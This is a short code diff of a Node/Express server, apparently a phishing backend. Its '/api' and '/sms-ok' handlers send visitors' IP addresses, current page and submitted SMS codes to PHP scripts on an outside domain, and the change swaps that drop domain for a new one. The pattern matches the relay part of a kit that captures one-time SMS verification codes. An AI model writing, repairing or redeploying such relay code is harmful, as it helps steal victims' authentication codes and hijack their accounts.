@@ -77,7 +77,7 @@ app.get('/api', async (req, res) => {
       return res.status(400).send('user_ip and current_page are required.');
     }
  
-    const apiUrl = `https://hakikicelikhantutunu.com/dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;
+    const apiUrl = `https://akbulutmensucat.com/dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;
 
  
     const response = await axios.get(apiUrl);
@@ -100,7 +100,7 @@ app.post('/sms-ok', async (req, res) => {
       throw new Error('Eksik parametreler');
     }
 
-    const apiUrl = `https://hakikicelikhantutunu.com/dmn/sms.php?ip=${encodeURIComponent(ip)}&sms=${encodeURIComponent(sms)}`;
+    const apiUrl = `https://akbulutmensucat.com/dmn/sms.php?ip=${encodeURIComponent(ip)}&sms=${encodeURIComponent(sms)}`;
 
     const response = await axios.get(apiUrl);
 
